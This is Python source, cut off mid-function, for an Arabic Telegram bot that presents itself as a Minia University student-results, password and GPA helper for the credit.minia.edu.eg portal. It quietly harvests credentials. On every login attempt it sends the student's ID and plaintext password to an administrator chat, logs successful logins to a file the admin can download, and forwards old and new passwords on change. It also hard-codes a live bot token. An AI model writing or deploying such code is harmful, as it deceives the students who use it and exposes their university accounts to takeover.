import telebot
from telebot import types
import requests
from bs4 import BeautifulSoup
import json
from urllib.parse import quote
import time
import threading
import os

admin_chat_id = 1792449471
admin_chat_id2 = 5321637533
token ="5488628256:AAEeCK9HzMvZi7gpVKjyWXsxv2K6pU6L2xg"
bot = telebot.TeleBot(token)
######### 📌 لوحة تحكم الأدمن
def get_admin_keyboard():
    keyboardd = types.InlineKeyboardMarkup()
    keyboardd.row_width = 2
    btn_ban = types.InlineKeyboardButton("🚫 حظر", callback_data="ban_user")
    btn_unban = types.InlineKeyboardButton("✅ فك الحظر", callback_data="unban_user")
    btn_stats = types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")
    btn_broadcast = types.InlineKeyboardButton("📢 إذاعة", callback_data="broadcast")
    send_user=types.InlineKeyboardButton("📩ارسال رسالة", callback_data="send_user1")
    
    keyboardd.add(btn_ban, btn_unban)
    keyboardd.add(btn_stats, btn_broadcast)
    keyboardd.add(send_user)

    return keyboardd
    
#__&&&&_____
keyboard2 = types.InlineKeyboardMarkup()
pas1 = types.InlineKeyboardButton(text='معرفة الباسورد✅', callback_data='send_password')
natega1 = types.InlineKeyboardButton(text='اعادة المحاولة 🔁', callback_data='echo_all')
back_button = types.InlineKeyboardButton(text='رجوع🔙', callback_data='back')
keyboard2.row(pas1)
keyboard2.row(natega1)
keyboard2.row(back_button)
gpa_button = types.InlineKeyboardButton(text='حساب GPA 🎓', callback_data='calculate_gpa')
##المطور
keyboard3 = types.InlineKeyboardMarkup()
dev = types.InlineKeyboardButton(text="𓆩⋆ ׅᎯ𝑳 ׅ𝕯𝔞l̸𝑔𝔞🅦︎𝕪 ׅ⋆𓆪", url='https://t.me/BO_R0')
keyboard3.row(dev)
#_______7__$$$$_$$$
keyboard = types.InlineKeyboardMarkup()
dev = types.InlineKeyboardButton(text="𓆩⋆ ׅᎯ𝑳 ׅ𝕯𝔞l̸𝑔𝔞🅦︎𝕪 ׅ⋆𓆪", url='https://t.me/BO_R0')
grop = types.InlineKeyboardButton(text='𝑴𝒊𝒏𝒊𝒂 𝑨𝒈𝒓𝒊𝒄𝒖𝒍𝒕𝒖𝒓𝒆☘️', url='https://t.me/+rbphVRSaWD9mNjg8')
natega = types.InlineKeyboardButton(text='الحصول علي النتيجة✅', callback_data='echo_all')
pas = types.InlineKeyboardButton(text='معرفة الباسورد👁️‍🗨️', callback_data='send_password')
change_pass = types.InlineKeyboardButton(text='تغيير الباسورد🔑', callback_data='change_password')

keyboard.row(natega, pas)
keyboard.row(change_pass,gpa_button)
keyboard.row(dev, grop)

#ارسال users للادمن
@bot.message_handler(commands=['users'])
def users_command(message):
    if str(message.chat.id) == str(admin_chat_id):
        with open('Users.txt', 'rb') as file:
            bot.send_document(admin_chat_id, file)
    else:
        bot.reply_to(message, 'ليس لديك صلاحية الوصول لهذا الأمر.')
#________________$$$$$$$
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')

    try:
        with open("ids.txt", "r") as file:
            Tho = file.read().splitlines()
    except FileNotFoundError:
        Tho = []

    try:
        with open("ban.txt", "r") as file:
            ban = file.read().splitlines()
    except FileNotFoundError:
        ban = []

    if str(chat_id) in ban:
        bot.send_message(chat_id, "🚫 *تم حظرك من استخدام هذا البوت.*\n🔹 إذا كنت تعتقد أن هناك خطأ، يرجى التواصل مع المطور.", parse_mode="Markdown",reply_markup=keyboard3)
        return

    if str(chat_id) == str(admin_chat_id):
        bot.send_message(chat_id, "🎩 *مرحبًا أيها الأدمن! يمكنك استخدام لوحة التحكم أدناه:*",
                         parse_mode="Markdown", reply_markup=get_admin_keyboard())
    else:
        is_new_user = False  
        if str(chat_id) not in Tho:
            with open("ids.txt", "a") as file:
                file.write(f"{chat_id}\n")
            is_new_user = True   
        bot.reply_to(message, f"👋 • مرحبا بك ي باشمهندس [{message.from_user.first_name}](tg://user?id={message.from_user.id})!\n"
                          f"🤖• في بوت [{bot.get_me().first_name}](https://t.me/{bot.get_me().username}) للحصول على النتيجة.\n"
                          f"📚 • يمكنك استخدام البوت للحصول على النتائج.\n"
                          f"🔑 • كما يمكنك أيضًا معرفة باسورد ابن الهيثم.",
                 parse_mode='Markdown', reply_markup=keyboard)

        if is_new_user:
            bot.send_message(
                admin_chat_id2,
                f"ℹ️ تم دخول شخص جديد إلى البوت الخاص بك :\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 *الاسم:* {message.from_user.first_name} {message.from_user.last_name or ''}\n"
                f"🔹 *المعرف:* {f'@{message.from_user.username}' if message.from_user.username else 'لا يوجد'}\n"
                f"🆔 *ID:* `{message.from_user.id}`\n"
                f"🌍 *الدولة:* `{message.from_user.language_code.upper()}`\n"
                f"🤖 *بوت؟:* `{'نعم' if message.from_user.is_bot else 'لا'}`\n"
                f"━━━━━━━━━━━━━━━━━━━",
                
            )

keyboard1 = types.InlineKeyboardMarkup()
back_button = types.InlineKeyboardButton(text='رجوع🔙', callback_data='back')
keyboard1.row(back_button)

@bot.callback_query_handler(func=lambda call: not call.data.startswith("grade_") and call.data not in ["enter_cgpa", "cancel_cgpa","send_user1"])
def callback_query(call):
    chat_id = call.message.chat.id

    # ✅ التحقق إذا كان المستخدم يحاول استخدام أوامر الأدمن
    admin_commands = ["ban_user", "unban_user", "stats", "broadcast"]
    if call.data in admin_commands:
        if str(chat_id) != str(admin_chat_id):
            bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية لاستخدام هذه الأوامر.")
            return
        
        if call.data == "ban_user":
            bot.edit_message_text(
    chat_id=call.message.chat.id,
    message_id=call.message.message_id,
    text="• *أرسل ID المستخدم الذي تريد حظره:*",
    parse_mode="Markdown",reply_markup=keyboard1
)
            bot.register_next_step_handler(call.message, process_ban)

        elif call.data == "unban_user":
            bot.edit_message_text(
    chat_id=call.message.chat.id,
    message_id=call.message.message_id,
    text="• *أرسل ID المستخدم الذي تريد فك الحظر عنه:*",
    parse_mode="Markdown",reply_markup=keyboard1
)
            bot.register_next_step_handler(call.message, process_unban)

        elif call.data == "stats":
            stats(call.message)

        elif call.data == "broadcast":
            bot.edit_message_text(
    chat_id=call.message.chat.id,
    message_id=call.message.message_id,
    text="✉️ *أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:*",
    parse_mode="Markdown",reply_markup=keyboard1
)
            
            bot.register_next_step_handler(call.message, process_broadcast)
        
        
        return  
    # ✅ التحقق مما إذا كان المستخدم محظورًا
    try:
        with open("ban.txt", "r") as file:
            banned_users = file.read().splitlines()
    except FileNotFoundError:
        banned_users = []

    if str(chat_id) in banned_users:
        bot.answer_callback_query(call.id, "🚫 *أنت محظور من استخدام هذا البوت.*", show_alert=True)
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🚫 *تم حظرك من استخدام هذا البوت.*",
            parse_mode="Markdown"
        )
        return
    if call.data == 'echo_all':
        bot.clear_step_handler(call.message)
        echo_all(call.message)
    elif call.data == 'back':
        bot.clear_step_handler(call.message)
        bot.edit_message_text(chat_id=chat_id,
                              message_id=call.message.message_id,
                              text=f"🔙•تم الرجوع إلى القائمة الرئيسية\n"
                                   f"📚 • يمكنك استخدام البوت للحصول على النتائج.\n"
                                   f"🔑 • كما يمكنك أيضًا معرفة باسورد ابن الهيثم.",
                              parse_mode='Markdown',
                              reply_markup=keyboard)
    elif call.data == "send_password":
        bot.clear_step_handler(call.message)
        send_password(call.message)
    elif call.data == "change_password":
        bot.clear_step_handler(call.message)
        change_password_step1(call)
    elif call.data == "calculate_gpa":
        bot.clear_step_handler(call.message)
        request_course_count(call)

	

def send_password(message):
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text=" ادخل البريد الإلكتروني الخاص بك:", reply_markup=keyboard1)
    
    bot.register_next_step_handler(message, process_email)

def process_email(message):
    mail = message.text

    if mail:
        id = mail[:8]
        url = "http://credit.minia.edu.eg/stuJCI"
       
        headers = {
            "Host": "credit.minia.edu.eg",
            "Connection": "keep-alive",
            "Content-Length": "91",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRFToken": "null",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "http://credit.minia.edu.eg",
            "Referer": "http://credit.minia.edu.eg/static/index.html",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        data = {
            "param0": "Mail.Mail",
            "param1": "SendMail",
            "param2": id,
            "param3": mail,
            "param4": "2"
        }

        try:
            res = requests.post(url, headers=headers, data=data, timeout=10)
            chat_id = message.chat.id
            bot.send_chat_action(chat_id, 'typing')

            if not res.ok:
            	bot.reply_to(message, "توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
            	

            if "success" in res.text:
                bot.reply_to(message, "•تم إرسال كلمة المرور إلى outlook بنجاح ✅.\n•قم بالتسجيل الان الي outlook بستخدام البريد والباسورد من خلال هذا اللينك\nhttps://outlook.office365.com/mail/inbox", reply_markup=keyboard1)
                admin_message1 = (
                    f"• **المستخدم:** {message.from_user.first_name} (@{message.from_user.username})\n"
                    f"• تم إرسال كلمة المرور للبريد الإلكتروني بنجاح ✅.\n{mail}"
                )
                bot.send_message(admin_chat_id, admin_message1)
            elif "fail" in res.text:
                if "local variable 'Conn' referenced before assignment" in res.text:
                    bot.reply_to(message, "حدث خطأ أثناء الاتصال بالخادم. حاول لاحقا❗.", reply_markup=keyboard1)
                else:
                    bot.reply_to(message, "عنوان البريد الإلكتروني غير مسجل على النظام❌", reply_markup=keyboard1)
        except requests.Timeout:
            bot.reply_to(message, "• تم ايقاف هذا الامر من قبل المطور 🚫", reply_markup=keyboard1)

                
def echo_all(message):
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="🆔 *ادخل كود الطالب:*",
        parse_mode="Markdown",
        reply_markup=keyboard1
    )
    bot.register_next_step_handler(message, process_id)

# ✅ **دالة استقبال كود الطالب**
def process_id(message):
    if not message.text.isdigit():
        bot.reply_to(message, "❌ الرجاء إدخال كود الطالب الصحيح (أرقام فقط).", reply_markup=keyboard1)
        return

    student_id = message.text
    bot.reply_to(message, "🔑 *ادخل كلمة المرور:*", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_password, student_id)


def process_password(message, student_id):
    thread = threading.Thread(target=process_password_thread, args=(message, student_id))
    thread.start()


def process_password_thread(message, student_id):
    password = message.text
    chat_id = message.chat.id
    password_message_id = message.message_id  

    sent_message = bot.reply_to(message, "🔍 *يتم التحقق من كلمة المرور...*", parse_mode="Markdown")
    temp_message_id = sent_message.message_id

    url1 = "http://credit.minia.edu.eg/studentLogin"
    headers1 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "72",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    data1 = {
        "UserName": student_id,
        "Password": password,
        "sysID": "313.",
        "UserLang": "E",
        "userType": "2",
    }

    try:
        response1 = requests.post(url1, headers=headers1, data=data1, timeout=10)
        bot.delete_message(chat_id=chat_id, message_id=password_message_id)

        if not response1.ok:
            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
            return

        if "LoginOK" in response1.text and json.loads(response1.text)["rows"][0]["row"]["LoginOK"] == "True":
            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•تم التحقق من كلمة المرور وجاري الحصول على النتيجة✅. \n•يرجى الانتظار قد يستغرق الامر دقيقتين كحد اقصى...⏳") 
            chat_id = message.chat.id
            bot.send_chat_action(chat_id, 'typing')
            cookies = response1.headers["Set-Cookie"]    
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌\n•لمعرفة كلمة المرور الصحيحه قم بالنقر على الزر أدناه:⬇️", reply_markup=keyboard2)

            try:
            	admin_message = (
            f"ℹ️ *معلومات المستخدم:*❌\n"
            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
            f"• **كود الطالب:** {student_id} \n"
            f"• **كلمة المرور:** {password}\n"
            f"-------------------------------------\n"
            f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
        )
            	bot.send_message(admin_chat_id, admin_message)
            except Exception as e:
            	error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
            	bot.send_message(admin_chat_id, error_message)
            return    
    except requests.Timeout:
        bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text=" الموقع لا يعمل برجاء المحاولة مرة اخري لاحقاً❌")
        return
    url2 = "http://credit.minia.edu.eg/getJCI"
    headers2 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "223",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/PortalStudent.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": cookies
    }
    payload = {
        "param0": "Reports.RegisterCert",
        "param1": "getTranscript",
        "param2": '{"crsReplaceHide":"true","ShowDetails":"true","portalFlag":"true","RegType":"student","AppType":"result"}'
    }
    response1 = requests.post(url2, headers=headers2, data=payload).text
    soup = BeautifulSoup(response1, 'html.parser')
    json_text = soup.get_text()
    data2 = json.loads(json_text)
    name=data2["stuName"]
    calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message)
    calculate_and_send_course_info(chat_id, data2,temp_message_id)

def grade_translation(grade):
    if grade == 'A':
        return 'A', 'ممتاز مرتفع'
    elif grade == 'A-':
        return 'A-', 'ممتاز'
    elif grade == 'B+':
        return 'B+', 'جيد جداً مرتفع'
    elif grade == 'B':
        return 'B', 'جيد جداً'
    elif grade == 'B-':
        return 'B-', 'جيد مرتفع'
    elif grade == 'C+':
        return 'C+', 'جيد'
    elif grade == 'C':
        return 'C', 'مقبول مرتفع'
    elif grade == 'C-':
        return 'C-', 'مقبول'
    elif grade == 'D+':
        return 'D+', 'مقبول مشروط مرتفع'
    elif grade == 'D':
        return 'D', 'مقبول مشروط'
    elif grade == 'F':
        return 'F', 'راسب'
    elif grade == 'Fr':
        return 'Fr', 'راسب تحريري'
    elif grade == 'Z':
        return 'Z', 'ممنوع من الامتحان'
    elif grade == 'P':
        return 'P', 'إجتاز'
    else:
        return grade, ''
def calculate_and_send_course_info(chat_id, data2,temp_message_id):
    bot.delete_message(chat_id=chat_id, message_id=temp_message_id)    
    try:
        for year_idx, year_data in enumerate(data2["StuSemesterData"]):
            for sem_idx, semester in enumerate(year_data["Semesters"]):
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                
                if semester_gpa == '':
                    semester_gpa_text = "لا يوجد بيانات تقديرية"
                else:
                    semester_gpa = float(semester_gpa)
                    semester_gpa_text = f"*{semester_gpa}*"
                    
                if cumulative_gpa == '':
                    cumulative_gpa = 0.0
                else:
                    cumulative_gpa = float(cumulative_gpa)
                
                total_credits, message = print_course_info(semester["Courses"], semester_name, cumulative_gpa)
                
                # Determine the GPA evaluation
                if cumulative_gpa == 4.0:
                    gpa_evaluation = "ممتاز مرتفع"
                elif 3.7 <= cumulative_gpa < 4.0:
                    gpa_evaluation = "ممتاز"
                elif 3.3 <= cumulative_gpa < 3.7:
                    gpa_evaluation = "جيد جداً مرتفع"
                elif 3.0 <= cumulative_gpa < 3.3:
                    gpa_evaluation = "جيد جداً"
                elif 2.7 <= cumulative_gpa < 3.0:
                    gpa_evaluation = "جيد مرتفع"
                elif 2.3 <= cumulative_gpa < 2.7:
                    gpa_evaluation = "جيد"
                elif 2.0 <= cumulative_gpa < 2.3:
                    gpa_evaluation = "مقبول مرتفع"
                elif 1.7 <= cumulative_gpa < 2.0:
                    gpa_evaluation = "مقبول"
                elif 1.3 <= cumulative_gpa < 1.7:
                    gpa_evaluation = "مقبول مشروط مرتفع"
                elif 1.0 <= cumulative_gpa < 1.3:
                    gpa_evaluation = "مقبول مشروط"
                elif 0.0 < cumulative_gpa < 1.0:
                    gpa_evaluation = "راسب"
                else:
                    gpa_evaluation = ""
                
                message_text = f"{message}\nالساعات المسجلة: {semester['RegHrs']}        الساعات الحاصل عليها: {semester['CurrCH']}\nالمعدل الفصلي: *{semester_gpa}*        المعدل التراكمي: *{cumulative_gpa}*\n          •التقدير التراكمي (*{gpa_evaluation}*)"
                                
                bot.send_message(chat_id, message_text, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}", parse_mode='Markdown')
def calculate_and_send_course_info1(chat_id, data2, admin_chat_id):
    try:
        for year_data in data2["StuSemesterData"]:
            for semester in year_data["Semesters"]:
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                total_credits, message_text = print_course_info(semester["Courses"], semester_name, cumulative_gpa)
                message = f"{message_text}\nالساعات المسجلة: {semester['RegHrs']}        الساعات الحاصل عليها: {semester['CurrCH']}\nالمعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}"
                bot.send_message(admin_chat_id, message, parse_mode='Markdown')
    except Exception as e:
        print(f"حدث خطأ: {e}")

def calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message):
    try:
        admin_message = (f"\n--------------------------------------\n"
            f"ℹ️ *معلومات المستخدم:*✅\n"
            f"• **اسم الطالب:** {name} \n"
            f"• **كود الطالب:** {student_id} \n"
            f"• **كلمة المرور:** {password}\n"
            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})"
        )

        for year_data in data2["StuSemesterData"]:
            for semester in year_data["Semesters"]:
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                total_credits, message_text = print_course_info(semester["Courses"], semester_name, cumulative_gpa)
                admin_message += f"\n•المعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}"

        bot.send_message(admin_chat_id, admin_message)
        with open('Users.txt', 'r') as file:
            file_contents = file.read()   
        if str(student_id) not in file_contents:     
            with open('Users.txt', 'a') as file:
                file.write(f"{admin_message}")
    except Exception as e:
        print(f"حدث خطأ: {e}")

def print_course_info(course_data, semester_name, gpa_evaluation):
    message_text = f"\n{semester_name}:\n"
    message_text += "الساعات المعتمدة | اسم المقرر | التقدير |\n"
    message_text += f"--------------------------------\n"
    
    total_credits = 0

    for course in course_data:
        course_name = course["CourseName"].replace('|', '')  
        course_credit = int(course["CourseCredit"])
        grade = course.get("Grade", "غير معلن")
       
        normalized_grade = grade.split('|')[0].strip()
        
        translated_grade = grade_translation(normalized_grade)
        bold_normalized_grade = f"*{translated_grade[0]}*"
        arabic_translation = translated_grade[1]

        total_credits += course_credit
        message_text += f"• {course_credit} {course_name} {bold_normalized_grade} ({arabic_translation})\n"
        
    return total_credits, message_text

#$_____$$$$$$$$$تغير الباسورد

def change_password_step1(call):
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="برجاء ادخال ID (كود الطالب) 🆔:",
        reply_markup=keyboard1
    )
    bot.register_next_step_handler(call.message, process_user_id)

def process_user_id(message):
    user_id = message.text
    msg = bot.send_message(message.chat.id, "الرجاء إدخال كلمة المرور الحالية:")
    bot.register_next_step_handler(msg, process_current_password, user_id)

def process_current_password(message, user_id):
    current_password = message.text
    msg = bot.send_message(message.chat.id, "الرجاء إدخال كلمة المرور الجديدة:")
    bot.register_next_step_handler(msg, process_new_password, user_id, current_password)

def process_new_password(message, user_id, current_password):
    new_password = message.text

    session = requests.Session()

    # تسجيل الدخول
    url3 = "http://credit.minia.edu.eg/studentLogin"
    headers1 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "72",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": quote("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/120.0.0.0 Safari/537.36"),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    data = {
        "UserName": user_id,
        "Password": current_password,
        "sysID": "313.",
        "UserLang": "E",
        "userType": "2",
    }

    try:
        response = session.post(url3, headers=headers1, data=data, timeout=10)
        if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
            msg = bot.send_message(message.chat.id, "تم التسجيل بنجاح. الآن جاري تغيير كلمة المرور...")

            # تغيير كلمة المرور
            url = "http://credit.minia.edu.eg/getJCI"
            payload = f"param0=stuAdmission.stuAdmission&param1=ChangePassWord&param2={{\"UserPassword\":\"{new_password}\"}}"
            headers = {
                'User-Agent': quote("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"),
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/x-www-form-urlencoded",
                'X-Requested-With': "XMLHttpRequest",
                'X-CSRFToken': "null",
                'Origin': "http://credit.minia.edu.eg",
                'Referer': "http://credit.minia.edu.eg/static/PortalStudent.html",
                'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            }

            response = session.post(url, data=payload, headers=headers)
            chat_id = message.chat.id
            bot.send_chat_action(chat_id, 'typing')


            if not response.ok:
                bot.reply_to(message, "توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
                return

            if "failed" in response.text:
                bot.edit_message_text(
                    chat_id=msg.chat.id,
                    message_id=msg.message_id,
                    text="تم تغيير كلمة المرور بنجاح ✅",
                    reply_markup=keyboard1
                )

                admin_message1 = (
                    f"• **المستخدم:** {message.from_user.first_name} (@{message.from_user.username})\n"
                    f"• تم تغيير كلمة المرور بنجاح ✅.\n• كود الطالب: {user_id}\n"
                    f"• كلمة المرور الحالية: {current_password}\n"
                    f"• كلمة المرور الجديدة: {new_password}"
                )
                bot.send_message(admin_chat_id, admin_message1)
            else:
                bot.reply_to(message, "حدث خطأ أثناء تغيير كلمة المرور. حاول لاحقًا❗", reply_markup=keyboard1)

        else:
            bot.reply_to(message, "كلمة المرور الحالية غير صحيحة حاول مرة أخرى❌", reply_markup=keyboard1)
    except requests.Timeout:
        bot.reply_to(message, "الموقع لا يعمل برجاء المحاولة مرة اخرى لاحقاً❌", reply_markup=keyboard1)
bot.delete_webhook(drop_pending_updates=True)
#حساب gpa
user_courses = {}
user_data = {}
def request_course_count(call):
    chat_id = call.message.chat.id
    user_courses[chat_id] = []  # تهيئة بيانات المستخدم
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="📚 يرجى إدخال عدد المواد التي تريد حساب GPA لها:",
        reply_markup=keyboard1
    )
    bot.register_next_step_handler(call.message, process_course_count)

def process_course_count(message):
    try:
        chat_id = message.chat.id
        num_courses = int(message.text)
        if num_courses <= 0:
            bot.send_message(chat_id, "يرجى إدخال رقم صحيح (1 أو أكثر). حاول مجددًا.")
            return
        bot.send_message(chat_id, f"الآن، سنبدأ اختيار التقديرات والساعات لكل مادة.")
        ask_for_grade(chat_id, num_courses, 0)
    except ValueError:
        bot.send_message(message.chat.id, "يرجى إدخال رقم صحيح.")

# عرض أزرار التقديرات للمستخدم
def ask_for_grade(chat_id, total_courses, current_course):
    keyboard = types.InlineKeyboardMarkup(row_width=3)
    grades = ["A", "A-", "B+", "B", "B-", "C+", "C", "C-", "D+", "D", "F"]
    buttons = [types.InlineKeyboardButton(text=grade, callback_data=f"grade_{grade}_{total_courses}_{current_course}") for grade in grades]
    keyboard.add(*buttons)
    
    bot.send_message(chat_id, f"📌 اختر تقدير المادة {current_course + 1}:", reply_markup=keyboard)

# استقبال اختيار التقديرات
@bot.callback_query_handler(func=lambda call: call.data.startswith("grade_"))
def handle_grade_selection(call):
    bot.answer_callback_query(call.id)  # تأكيد استقبال الضغط على الزر

    try:
        _, grade, total_courses, current_course = call.data.split("_")
        total_courses = int(total_courses)
        current_course = int(current_course)
        chat_id = call.message.chat.id

        if chat_id not in user_courses:
            user_courses[chat_id] = []

        # التأكد من تهيئة المادة الحالية بقيم افتراضية
        if len(user_courses[chat_id]) <= current_course:
            user_courses[chat_id].append({"grade": grade, "credit_hours": None})
        else:
            user_courses[chat_id][current_course]["grade"] = grade

        # طلب إدخال عدد الساعات بعد اختيار التقدير
        msg = bot.send_message(chat_id, f"📚 يرجى إدخال عدد الساعات المعتمدة للمادة {current_course + 1}:")
        bot.register_next_step_handler(msg, handle_credit_hours, total_courses, current_course)

        # حذف رسالة الاختيار بعد التأكد من تسجيل البيانات
        bot.delete_message(chat_id, call.message.message_id)

    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ: {str(e)}")


# استقبال عدد الساعات لكل مادة
def handle_credit_hours(message, total_courses, current_course):
    try:
        chat_id = message.chat.id
        credit_hours = int(message.text)
        if credit_hours <= 0:
            msg = bot.send_message(chat_id, "⚠️ يرجى إدخال رقم صحيح (1 أو أكثر) للساعات.")
            bot.register_next_step_handler(msg, handle_credit_hours, total_courses, current_course)
            return

        if chat_id in user_courses and len(user_courses[chat_id]) > current_course:
            user_courses[chat_id][current_course]["credit_hours"] = credit_hours
        else:
            bot.send_message(chat_id, "❌ خطأ: لم يتم العثور على بيانات المادة!")
            return

        if current_course + 1 < total_courses:
            ask_for_grade(chat_id, total_courses, current_course + 1)
        else:
            calculate_gpa(chat_id)

    except ValueError:
        msg = bot.send_message(message.chat.id, "❌ يرجى إدخال رقم صحيح للساعات.")
        bot.register_next_step_handler(msg, handle_credit_hours, total_courses, current_course)

# حساب الـ GPA
def calculate_gpa(chat_id):
    grade_points = {
        "A": 4.0, "A-": 3.7, "B+": 3.3, "B": 3.0, "B-": 2.7,
        "C+": 2.3, "C": 2.0, "C-": 1.7, "D+": 1.3, "D": 1.0,
        "F": 0.0
    }

    courses = user_courses[chat_id]
    total_points = sum(grade_points[course["grade"]] * course["credit_hours"] for course in courses)
    total_hours = sum(course["credit_hours"] for course in courses)

    if total_hours == 0:
        bot.send_message(chat_id, "لا يمكن حساب الـ GPA لأن عدد الساعات المعتمدة يساوي 0.")
        return

    gpa = total_points / total_hours
    user_data[chat_id] = {"gpa": gpa, "hours": total_hours}  # حفظ المعدل الفصلي

    grades_summary = "\n".join([f"• {course['grade']} ({course['credit_hours']} ساعة)" for course in courses])
    message_text = f"📚 المواد التي تم اختيارها:\n{grades_summary}\n\n🎓 *المعدل الفصلي (GPA): {gpa:.3f}*\n\n📊 هل تريد إدخال بيانات لحساب **المعدل التراكمي (CGPA)**؟"
    keyboard = types.InlineKeyboardMarkup()
    cgpa_button = types.InlineKeyboardButton(text='إدخال المعدل التراكمي السابق',
    callback_data='enter_cgpa')
    cancel_button = types.InlineKeyboardButton(text='إلغاء', callback_data='cancel_cgpa')
    keyboard.row(cgpa_button)
    keyboard.row(cancel_button)
    bot.send_message(chat_id, message_text, parse_mode="Markdown", reply_markup=keyboard)


# استقبال إدخال CGPA أو الإلغاء
@bot.callback_query_handler(func=lambda call: call.data in ["enter_cgpa", "cancel_cgpa"])

def handle_cgpa_input(call):
    chat_id = call.message.chat.id
    if call.data == "enter_cgpa":
        # نطلب أولاً إدخال المعدل التراكمي السابق فقط
        bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="•🔢 يرجى إدخال المعدل التراكمي السابق:",
        
    )
        bot.register_next_step_handler(call.message, save_prev_gpa)
    else:
        bot.delete_message(chat_id, call.message.message_id)

# حفظ المعدل التراكمي السابق
def save_prev_gpa(message):
    chat_id = message.chat.id
    try:
        prev_gpa = float(message.text)
        # حفظ المعدل السابق في بيانات المستخدم
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['prev_gpa'] = prev_gpa

        # الآن نطلب من المستخدم إدخال عدد الساعات السابقة
        bot.send_message(chat_id, "🔢 يرجى إدخال عدد الساعات السابقة:")
        bot.register_next_step_handler(message, save_prev_hours)
    except ValueError:
        bot.send_message(chat_id, "❌ الرجاء إدخال رقم صحيح للمعدل التراكمي.")
        bot.register_next_step_handler(message, save_prev_gpa)

# حفظ عدد الساعات السابقة وحساب الـ CGPA
def save_prev_hours(message):
    chat_id = message.chat.id
    try:
        prev_hours = float(message.text)
        if prev_hours <= 0:
